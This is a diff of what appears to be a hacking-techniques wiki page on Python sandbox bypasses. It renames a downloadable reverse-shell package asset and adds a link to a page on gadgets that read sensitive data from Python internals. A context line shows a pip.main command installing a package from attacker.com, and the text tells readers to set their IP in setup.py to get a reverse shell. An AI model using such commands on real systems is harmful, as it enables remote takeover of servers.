@@ -105,7 +105,7 @@ pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 
 You can download the package to create the reverse shell here. Please, note that before using it you should **decompress it, change the `setup.py`, and put your IP for the reverse shell**:
 
-{% file src="../../../.gitbook/assets/Reverse.tar.gz" %}
+{% file src="../../../.gitbook/assets/reverse.tar.gz" %}
 
 {% hint style="info" %}
 This package is called `Reverse`. However, it was specially crafted so that when you exit the reverse shell the rest of the installation will fail, so you **won't leave any extra python package installed on the server** when you leave.
@@ -796,6 +796,14 @@ class HAL9000(object):
 ```
 
 **More examples** about **format** **string** examples can be found in [**https://pyformat.info/**](https://pyformat.info)
+
+{% hint style="danger" %}
+Check also the following page for gadgets that will r**ead sensitive information from Python internal objects**:
+{% endhint %}
+
+{% content-ref url="../python-internal-read-gadgets.md" %}
+[python-internal-read-gadgets.md](../python-internal-read-gadgets.md)
+{% endcontent-ref %}
 
 ### Sensitive Information Disclosure Payloads
 
